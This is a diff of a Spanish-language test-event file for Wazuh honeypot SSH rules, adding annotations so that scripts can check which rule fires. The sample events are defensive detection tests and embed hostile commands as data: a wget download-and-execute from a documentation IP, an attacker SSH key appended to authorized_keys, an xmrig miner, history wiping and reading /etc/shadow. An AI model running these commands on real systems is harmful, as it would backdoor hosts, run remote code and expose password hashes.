@@ -1,80 +1,151 @@
-# Eventos de muestra para probar honeypot_rules_ssh.xml con wazuh-logtest.
-# Uso en el manager:   sudo /var/ossec/bin/wazuh-logtest
-# Pegar UNA linea JSON (las que no empiezan con #) y mirar que regla dispara.
-# Bajo cada linea, entre parentesis, la regla que deberia disparar.
+# Eventos de muestra para probar las reglas SSH del honeypot (conexiones y comandos).
+#
+# Dos formas de usarlo:
+#   A mano, en el manager:        sudo /var/ossec/bin/wazuh-logtest     (pegar UNA linea que no empiece con #)
+#   Automatico, en el manager:    sudo python3 tests/run_logtest.py
+# El CI corre un modelo offline de las reglas con estos mismos casos (tests/rule_model.py). Es una
+# aproximacion: la prueba de verdad es run_logtest.py en el manager.
+#
+# Las lineas "#@" las leen esos programas. Se aplican al evento que tienen debajo:
+#   expect=ID[,ID]   la regla que tiene que disparar (con varias, vale cualquiera)
+#   not=ID           una regla que NO tiene que disparar
+#   repeat=N         mandar el evento N veces; vale si la esperada dispara en alguna de las N
+#   session=NOMBRE   los casos con el mismo nombre comparten estado (reglas de frecuencia y correlacion)
+#   setup            caso de preparacion: se manda pero no se evalua
+#   needs=cdb        solo corre con --cdb (hace falta la lista registrada en ossec.conf)
 # Las IPs son de documentacion (RFC 5737), no son atacantes reales.
 
 # --- Conexiones (ssh_connections.json) ---
 
 # (100351) escaner que no habla SSH
+#@ expect=100351
 {"timestamp": "2026-10-26 21:00:01", "honeypot_event": "ssh_connection", "ip": "203.0.113.10", "resultado": "sin_banner", "banner": null, "duracion_seg": 0.1, "intentos_login": 0}
 
 # (100350) login fallido: solo base, no alerta
+#@ expect=100350
 {"timestamp": "2026-10-26 21:00:02", "honeypot_event": "ssh_connection", "ip": "203.0.113.11", "resultado": "login_fallido", "banner": "SSH-2.0-OpenSSH_9.6", "duracion_seg": 3.2, "intentos_login": 3}
 
 # (100353) entro con cliente Go
+#@ expect=100353
 {"timestamp": "2026-10-26 21:00:03", "honeypot_event": "ssh_connection", "ip": "203.0.113.12", "resultado": "autenticado_sin_shell", "banner": "SSH-2.0-Go", "duracion_seg": 11.5, "intentos_login": 1}
 
-# (100352) entro con un cliente que parece de persona
+# (100352) entro con un cliente que parece de persona: tiene que ganar 100352 y no 100353
+#@ expect=100352 not=100353
 {"timestamp": "2026-10-26 21:00:04", "honeypot_event": "ssh_connection", "ip": "203.0.113.13", "resultado": "shell", "banner": "SSH-2.0-OpenSSH_9.6", "duracion_seg": 40.0, "intentos_login": 1}
 
 # --- Comandos (shell_commands.json) ---
 
 # (100367) reconocimiento
+#@ expect=100367
 {"timestamp": "2026-10-26 21:01:00", "honeypot_event": "shell_command", "ip": "203.0.113.20", "command": "uname -a", "canal": "exec", "nota": "Comando por canal exec"}
 
 # (100361) clave SSH propia
+#@ expect=100361
 {"timestamp": "2026-10-26 21:01:01", "honeypot_event": "shell_command", "ip": "203.0.113.21", "command": "cd ~; chattr -ia .ssh; echo \"ssh-rsa AAAAB3NzaC1yc2E bot@x\" >> .ssh/authorized_keys", "canal": "exec", "nota": "Comando por canal exec"}
 
 # (100363) descargar y ejecutar en un solo comando
+#@ expect=100363
 {"timestamp": "2026-10-26 21:01:02", "honeypot_event": "shell_command", "ip": "203.0.113.22", "command": "wget http://203.0.113.9/x.sh; chmod +x x.sh; ./x.sh", "canal": "exec", "nota": "Comando por canal exec"}
 
 # (100310, regla que ya existia) la parte de descarga, registrada por separado con su nota
+#@ expect=100310
 {"timestamp": "2026-10-26 21:01:02", "honeypot_event": "shell_command", "ip": "203.0.113.22", "command": "wget http://203.0.113.9/x.sh", "canal": "exec", "nota": "ALERTA: Intento de descarga de http://203.0.113.9/x.sh"}
 
 # (100362) criptominero
+#@ expect=100362
 {"timestamp": "2026-10-26 21:01:03", "honeypot_event": "shell_command", "ip": "203.0.113.23", "command": "./xmrig -o stratum+tcp://pool.example:3333", "canal": "shell", "nota": ""}
 
 # (100364) cuentas de usuario
+#@ expect=100364
 {"timestamp": "2026-10-26 21:01:04", "honeypot_event": "shell_command", "ip": "203.0.113.24", "command": "useradd -m test", "canal": "shell", "nota": ""}
 
 # (100364 NO deberia disparar: es lectura, cae en 100367)
+#@ expect=100367 not=100364
 {"timestamp": "2026-10-26 21:01:05", "honeypot_event": "shell_command", "ip": "203.0.113.25", "command": "cat /etc/passwd", "canal": "shell", "nota": ""}
 
 # (100365) cron
+#@ expect=100365
 {"timestamp": "2026-10-26 21:01:06", "honeypot_event": "shell_command", "ip": "203.0.113.26", "command": "crontab -l", "canal": "exec", "nota": "Comando por canal exec"}
 
 # (100366) borrar rastros
+#@ expect=100366
 {"timestamp": "2026-10-26 21:01:07", "honeypot_event": "shell_command", "ip": "203.0.113.27", "command": "history -c", "canal": "shell", "nota": ""}
 
-# (100360) comando sin patron conocido: solo base. Probar tambien cat /etc/shadow:
-# (ya no cae aca: ver 100368 mas abajo)
+# (100360) comando sin patron conocido: solo base
+#@ expect=100360
 {"timestamp": "2026-10-26 21:01:08", "honeypot_event": "shell_command", "ip": "203.0.113.28", "command": "ls -la", "canal": "shell", "nota": ""}
-
-# --- Frecuencia (regla 100354) ---
-# Pegar 5 veces seguidas, en menos de 5 minutos, la linea de 100353 de arriba
-# (misma IP). A la quinta deberia disparar 100354.
 
 # --- Reglas agregadas el 27 de octubre ---
 
 # (100368) hashes de contrasenas: debe ganarle a 100367
+#@ expect=100368 not=100367
 {"timestamp": "2026-10-27 16:00:01", "honeypot_event": "shell_command", "ip": "203.0.113.30", "command": "cat /etc/shadow", "canal": "exec", "nota": "Comando por canal exec"}
 
-# (100369) verificacion de la shell, como la que mando 80.94.92.179
+# (100369) verificacion de la shell, como la que mando un escaner real (IP enmascarada: 80.94.x.x)
+#@ expect=100369
 {"timestamp": "2026-10-27 16:00:02", "honeypot_event": "shell_command", "ip": "203.0.113.31", "command": "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' check_26c845a5c579f0a359d8773a287d0ad4 \"$((956*983+35))\"'", "canal": "shell", "nota": ""}
 
 # (100348) sondeo de API de modelos de IA por HTTP
+#@ expect=100348
 {"timestamp": "2026-10-27 16:00:03", "honeypot_event": "http_request", "ip": "203.0.113.32", "method": "GET", "path": "/api/v1/models"}
 
-# --- Correlacion (100370) ---
-# En una misma sesion de wazuh-logtest: pegar 8 veces seguidas (menos de 60 s) esta linea
-# para que salte la fuerza bruta (con 8 salta 100303 a la 5.a; 100302 necesitaria una novena) ...
+# --- Negativos y bordes (los documentan los README: lo que la regla NO ve) ---
+
+# Una descarga sin la nota del honeypot no dispara 100310 ni 100363: la nota la pone la shell falsa.
+# Si algun dia la shell dejara de poner la nota, esta muestra mostraria el hueco.
+#@ expect=100360 not=100310,100363
+{"timestamp": "2026-10-30 09:00:01", "honeypot_event": "shell_command", "ip": "203.0.113.50", "command": "wget http://203.0.113.9/x.sh", "canal": "exec", "nota": ""}
+
+# Leer known_hosts no es dejar una clave propia: nada de authorized_keys, queda en la base.
+#@ expect=100360 not=100361
+{"timestamp": "2026-10-30 09:00:02", "honeypot_event": "shell_command", "ip": "203.0.113.51", "command": "cat ~/.ssh/known_hosts", "canal": "shell", "nota": ""}
+
+# Un comando inofensivo parecido a un criptominero NO debe disparar 100362 (sin xmrig, stratum, etc.).
+#@ expect=100360 not=100362
+{"timestamp": "2026-10-30 09:00:03", "honeypot_event": "shell_command", "ip": "203.0.113.52", "command": "echo hola", "canal": "shell", "nota": ""}
+
+# --- Muestra de VirusTotal (malware_capture) ---
+
+# (100320) muestra marcada como maliciosa
+#@ expect=100320
+{"timestamp": "2026-10-30 09:01:00", "honeypot_event": "malware_capture", "ip": "203.0.113.53", "url": "http://203.0.113.9/x", "nombre_archivo": "x", "tama\u00f1o_bytes": 10, "hashes": {"md5": "00000000000000000000000000000000", "sha256": "0000000000000000000000000000000000000000000000000000000000000000"}, "virustotal": {"maliciosos": 5}}
+
+# Muestra que VirusTotal no marca (0 maliciosos): no debe disparar 100320.
+#@ not=100320
+{"timestamp": "2026-10-30 09:01:01", "honeypot_event": "malware_capture", "ip": "203.0.113.54", "url": "http://203.0.113.9/y", "nombre_archivo": "y", "tama\u00f1o_bytes": 10, "hashes": {"md5": "11111111111111111111111111111111", "sha256": "1111111111111111111111111111111111111111111111111111111111111111"}, "virustotal": {"maliciosos": 0}}
+
+# (100301) un intento de login SSH suelto: solo la base, nivel 2
+#@ expect=100301
+{"timestamp": "2026-10-30 09:02:00", "honeypot_event": "ssh_login_attempt", "ip": "203.0.113.35", "username": "root", "password": "123456"}
+
+# --- Frecuencia y correlacion: solo se prueban en wazuh-logtest (el modelo offline no las evalua) ---
+# Los umbrales son los de las reglas. Wazuh cuenta con su propio reloj, no con el timestamp del evento.
+
+# (100354) 5 entradas aceptadas de la misma IP en menos de 5 minutos. Se manda 6 veces por si
+# el umbral cuenta el evento actual o solo los anteriores.
+#@ session=go repeat=6 expect=100354
+{"timestamp": "2026-10-26 21:00:03", "honeypot_event": "ssh_connection", "ip": "203.0.113.12", "resultado": "autenticado_sin_shell", "banner": "SSH-2.0-Go", "duracion_seg": 11.5, "intentos_login": 1}
+
+# (100302) fuerza bruta rapida: el README observo 100303 en el 5.o evento y 100302 en el 9.o.
+#@ session=rapida repeat=12 expect=100302
+{"timestamp": "2026-10-27 16:01:00", "honeypot_event": "ssh_login_attempt", "ip": "203.0.113.34", "username": "root", "password": "admin"}
+
+# (100303) fuerza bruta lenta y, a continuacion, (100370) un acceso aceptado de la misma IP.
+# Con 8 intentos salta 100303 a la 5.a; 100302 necesitaria una novena.
+#@ session=corr repeat=8 expect=100303
 {"timestamp": "2026-10-27 16:01:00", "honeypot_event": "ssh_login_attempt", "ip": "203.0.113.33", "username": "root", "password": "admin"}
+
 # ... y despues, de la misma IP, esta (deberia disparar 100370, nivel 12):
+#@ session=corr expect=100370
 {"timestamp": "2026-10-27 16:01:20", "honeypot_event": "ssh_connection", "ip": "203.0.113.33", "resultado": "autenticado_sin_shell", "banner": "SSH-2.0-OpenSSH_9.6", "duracion_seg": 11.0, "intentos_login": 3}
 
 # --- Lista CDB (regla 100330) ---
 # Con "198.51.100.77:ejemplo-campania" en etc/lists/honeypot-attackers (IP EXACTA: un rango CIDR no
 # coincide en 4.14.8) y la lista registrada en ossec.conf, esta linea de sshd debe dar 100330.
-# Con una IP que no esta en la lista da 5760:
+#@ needs=cdb expect=100330
 Oct 27 16:02:00 ip-172-31-33-195 sshd[1234]: Failed password for root from 198.51.100.77 port 4444 ssh2
+
+# Con una IP que no esta en la lista da 5760:
+#@ needs=cdb expect=5760
+Oct 27 16:02:00 ip-172-31-33-195 sshd[1234]: Failed password for root from 203.0.113.99 port 4444 ssh2
+
